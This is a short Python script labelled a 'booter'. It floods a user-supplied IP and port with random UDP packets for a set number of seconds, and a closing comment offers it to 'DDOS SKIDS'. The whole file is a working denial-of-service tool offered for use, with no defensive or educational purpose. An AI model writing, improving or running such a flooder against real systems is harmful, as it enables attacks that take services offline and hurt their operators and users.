import socket
import random
import time
from colorama import Fore
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
print(Fore.BLUE + "\nshit booter!!")
print("\n\n")
ip = input(Fore.GREEN+ "IP: ")

port = int(input("Port: "))
duration = int(input("Time (seconds): "))
timeout = time.time() + duration
sent = 0

while True:
    if time.time() > timeout:
        break
    else:
        pass
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    print(Fore.RED + "[*] Packet sent to IP") 



# ENJOY !!! DDOS SKIDS!!!
